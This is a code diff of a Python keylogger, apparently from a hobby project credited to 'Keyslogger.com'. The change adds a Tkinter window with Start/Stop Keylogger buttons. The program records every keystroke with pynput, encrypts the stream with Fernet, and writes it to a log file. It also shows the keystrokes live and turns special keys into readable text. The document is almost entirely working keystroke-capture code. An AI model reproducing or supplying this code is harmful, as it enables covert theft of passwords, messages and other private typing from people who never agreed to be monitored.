@@ -1,9 +1,11 @@
 from cryptography.fernet import Fernet
 from pynput.keyboard import Listener
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
 import logging
 import os
 
-# Generating and saving the encryption key if it doesn't exist
+# Encryption Setup
 def load_or_generate_key():
     if not os.path.exists("key.key"):
         key = Fernet.generate_key()
@@ -14,44 +16,87 @@ def load_or_generate_key():
             key = key_file.read()
     return key
 
-# Loading the encryption key
 key = load_or_generate_key()
 cipher_suite = Fernet(key)
 
-# Setting up logging to store encrypted keystrokes in a file 
-
+# Setting up logging to store encrypted keystrokes in a file
 log_file = "encryptedkeyslogger.txt"
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')  
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
 
 def encrypt_log(log_entry):
     encrypted_data = cipher_suite.encrypt(log_entry.encode())
     return encrypted_data
 
-# Setting up the log file to store the keystrokes in a file
-log_file = "keyslogger.txt"
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-# Function to log the keystrokes
+# Keylogging function that also updates the GUI in real-time
 def on_press(key):
     try:
-        logging.info(str(key.char))
+        log_data = str(key.char)
     except AttributeError:
-        logging.info(str(key))
-    except Exception as e:
-        logging.error(f"Error capturing key: {e}")
+        log_data = str(key)
+    encrypted_log = encrypt_log(log_data)
+    logging.info(encrypted_log.decode())
 
-# Function to start the Listener
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    # Display the keystrokes in real-time in the GUI text box
+    log_display.insert(tk.END, log_data)
+    log_display.see(tk.END)  # Scroll to the end to show the latest entry
 
-# Decryption Logic 
+# Global listener variable to start and stop
+listener = None
 
-def decrypt_log_file (log_file):
-    with open (log_file, "r") as f:
-        encrypted_logs = f.readlines()
-        
-        for encrypted_log in encrypted_logs: 
-            decrypted_log = cipher_suite.decrypt(encrypted_log.encode())
-            print (decrypted_log.decode())
+# GUI Functions
+def start_keylogger():
+    global listener
+    if listener is None or not listener.running:  # Prevent multiple listeners
+        listener = Listener(on_press=on_press)
+        listener.start()
+        messagebox.showinfo("Keylogger", "Keylogger started.")
+    else:
+        messagebox.showwarning("Warning", "Keylogger is already running.")
 
-            
+def stop_keylogger():
+    global listener
+    if listener and listener.running:
+        listener.stop()
+        listener.join()
+        messagebox.showinfo("Keylogger", "Keylogger stopped.")
+    else:
+        messagebox.showwarning("Warning", "Keylogger is not running.")
+
+def convert_to_readable():
+    # Get the current text in the log_display
+    raw_text = log_display.get("1.0", tk.END)
+
+    # Replace special keys with readable format
+    readable_text = raw_text.replace("Key.space", " ").replace("Key.backspace", "[BACKSPACE]").replace("Key.enter", "\n").replace("Key.caps_lock", "[CAPS_LOCK]")
+    readable_text = readable_text.replace("Key.tab", "\t").replace("Key.shift", "[SHIFT]").replace("Key.ctrl", "[CTRL]")  # Add more replacements as needed
+
+    # Display the readable text in the readable_text_display
+    readable_text_display.delete("1.0", tk.END)
+    readable_text_display.insert(tk.END, readable_text)
+
+# Set up the GUI with Tkinter
+root = tk.Tk()
+root.title("Made with ❤️ by Keyslogger.com")
+root.geometry("500x600")
+
+# Start/Stop Buttons
+start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
+start_button.pack(pady=10)
+
+stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
+stop_button.pack(pady=10)
+
+# Text area to display encrypted keystrokes
+log_display = scrolledtext.ScrolledText(root, width=50, height=10)
+log_display.pack(pady=10)
+
+# Button to convert to readable format
+convert_button = tk.Button(root, text="Convert to Readable Format", command=convert_to_readable)
+convert_button.pack(pady=10)
+
+# Text area to display readable keystrokes
+readable_text_display = scrolledtext.ScrolledText(root, width=50, height=10)
+readable_text_display.pack(pady=10)
+
+# Run the GUI
+root.mainloop()
